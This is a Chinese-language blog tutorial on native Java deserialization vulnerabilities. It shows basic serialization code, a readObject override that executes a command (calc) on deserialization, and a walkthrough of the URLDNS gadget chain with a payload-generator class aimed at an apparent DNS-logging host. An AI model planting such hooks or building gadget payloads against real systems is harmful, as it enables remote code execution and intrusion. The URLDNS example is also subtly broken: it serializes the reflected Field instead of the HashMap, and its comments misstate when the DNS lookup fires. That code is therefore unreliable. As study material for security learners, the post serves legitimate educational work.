---
title: Java反序列化-01
description: 本文章记录了Java反序列化的基础知识，并使用最基础的利用链URLDNS作为示例
date: 2025-04-01
image: cover.png
categories:
    - cate1
tags:
    - Java
    - Serialization
---

## 前言

在这篇文章之前，我已经学习了有关fastjson的Java反序列化，但是在最近的比赛中考察到了Java原生反序列化的知识点，初步了解之后发现两者相距甚远，所以决定写下这篇这篇文章，记录一下Java反序列化的学习。虽然Java原生的反序列化已经十分少见，但是毕竟是网络安全，可以不用，不能不会，所以还是深入研究一下。

## 序列化与反序列化的代码实现

有关于序列化和反序列化的知识点这里不做赘述，个人建议从PHP开始了解序列化与反序列化，因为PHP的序列化更加简单些，这里贴出之前所写的文章链接，供师傅们学习：

[序列化与反序列化基础及反序列化漏洞(附案例)_反序列化漏洞代码-CSDN博客](https://blog.csdn.net/2301_79629995/article/details/142713714?spm=1001.2014.3001.5501)

还是先创建一个Java项目，创建一个类文件，键入如下代码。

### Person.java

```java
package org.example;

import java.io.Serializable;

public class Person implements Serializable {

    private String name;
    private int age;

    public Person(){

    }
    // 构造函数
    public Person(String name, int age){
        this.name = name;
        this.age = age;
    }

    @Override
    public String toString(){
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }
}
```

再创建一个类文件，键入如下代码，该代码为序列化代码：

### SerializationTest.java

```java
package org.example;


import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;

public class SerializationTest {
    public static void serialize(Object obj) throws IOException{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void main(String[] args) throws Exception{
        Person person = new Person("aa",22);
        System.out.println(person);
        serialize(person);
    }
}
```

最后创建一个反序列化文件：

### UnserializeTest.java

```java
package org.example;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class UnserializeTest {
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception{
        Person person = (Person)unserialize("ser.bin");
        System.out.println(person);
    }
}
```

### 运行效果

![image-20250330163748907](/image-20250330163748907.png)

![image-20250330163758818](/image-20250330163758818.png)

我们都知道，序列化的目的在于数据的传输。

在序列化的代码中，我们将序列化功能封装进入`serialize`方法中，我们通过`FileOutputStream`输出流，将序列化对象输出到`ser.bin`文件中，在通过`oss`的`writeObject`方法，对对象进行序列化操作。

在反序列化的代码中，我们将反序列化功能封装进入`unserialize`方法中，我们通过`FileInputStream`输入流，将序列化后的对象中`ser.bin`，文件中读取出来，再通过`obj`的`readObject`方法，对对象进行反序列化操作。

对于Java中的一些反序列化的特性，这里不做赘述，需要的师傅可以前往[第一篇参考文献](https://www.freebuf.com/articles/web/333697.html)中了解。

## 序列化与反序列化的安全问题

### 原因

在Java的序列化和反序列化中，有两个重要的方法，`readObject`和`writeObject`。这两个方法可以由开发者重写，一般来说，重写这两个方法存在于下面这种场景：

> 在一个类中，存在一个数组属性：array，初始化的数组长度为100。在实际的序列化过程中，假设让array参加序列化过程，那么长度为100的数组都会被序列化，而实际使用的可能不足30个，这显然是不合理的，所以这里就需要自定义序列化和反序列化的过程。具体做法就是重写`readObject`和`writeObject`方法。

综上所述，当服务端反序列化数据时，对应类中的readObject方法就会自动执行。所以**反序列化产生危害的根本在于`readObejct`方法**

### 漏洞形式

#### 一个简单的示例

这种形式在实际生产中其实并不常见，我们写一段弹出计算器的代码。

```java
private void readObject(ObjectInputStream in) throws java.io.IOException, ClassNotFoundException{
    in.defaultReadObject();
    Runtime.getRuntime().exec("calc");
}
```

序列化一下，再反序列化一下，就可以直接弹出计算器了。这是最理想的情况，实战中很少会出现这种情况

#### URLDNS Gadget

**URLDNS** 是 Java 反序列化漏洞中最经典、最简单的利用链之一，通常用于检测目标是否存在反序列化漏洞（因为它不会执行恶意代码，而是触发一次 DNS 请求）。它主要依赖 `HashMap` 和 `URL` 类的特性，结合 `hashCode()` 方法在反序列化时的自动调用机制。

##### URLDNS Gadget 的核心原理

###### 利用链组成

```java
HashMap.readObject() 
    -> HashMap.putVal() 
        -> HashMap.hash() 
            -> URL.hashCode() 
                -> URLStreamHandler.hashCode() 
                    -> URL.getHostAddress() 
                        -> InetAddress.getByName() 
                            -> DNS 查询
```

###### 关键点

> - **`HashMap` 反序列化时会计算 `hashCode`**
>   当 `HashMap` 被反序列化时，会调用 `readObject()`，进而调用 `hash()` 方法计算每个键（Key）的哈希值，触发 `key.hashCode()`。
> - **`URL` 类的 `hashCode()` 会触发 DNS 查询**
>   `URL.hashCode()` 默认调用 `URLStreamHandler.hashCode()`，而该方法会调用 `URL.getHostAddress()`，最终执行 `InetAddress.getByName(host)`，向目标域名发起 DNS 请求。

###### 解析

根据描述，我们有如下示例代码：

```java
package org.example;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class SerializationTest {
    public static void serialize(Object obj) throws IOException{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void main(String[] args) throws Exception{
        URL url = new URL("http://ybjhvjpune.dgrh3.cn");
        // 构造 HashMap，使 URL 作为 Key
        HashMap<URL, Integer> hashMap = new HashMap<>();
        hashMap.put(url, 1);
        // 修改 URL 的 hashCode 计算方式，避免 put 时提前触发 DNS
        // （反射修改 URL#hashCode 为 -1，使其在反序列化时重新计算）
        Field hashCodeField = URL.class.getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);
        hashCodeField.set(url, -1);  // 确保 put 时不触发 DNS
        // 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性
        serialize(hashCodeField);
    }
}
```

我们跟进`HashMap`这个类，找到其中的`readObject`这个方法。

![image-20250401162627771](/image-20250401162627771.png)

我们发现这里调用了`hash`这个方法，跟进`hash`。

![image-20250401162654339](/image-20250401162654339.png)

又发现这里调用了传入的对象`key`的`hashCode`的方法。根据上面的跟踪，我们知道当进行反序列化时，`readObject`这个方法会调用`HashMap`中的所有对象的`hashCode`方法。接下来我们回到一开始，去跟踪`URL`这个类中的`hashCode`方法。

![image-20250401163018582](/image-20250401163018582.png)

跟进我们发现，这里调用了`handler`这个对象的中的`hashCode`方法，`hanlder`又属于`URLStreamHandler`这个类。继续跟进`URLStreamHandler`这个类的`hashCode`方法。

![image-20250401163217979](/image-20250401163217979.png)

我们关注其中的`getHostAddress`方法。

![image-20250401163345449](/image-20250401163345449.png)

最后到这里，触发DNS请求。

## 参考文献

[Java反序列化基础篇-01-反序列化概念与利用 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/333697.html)

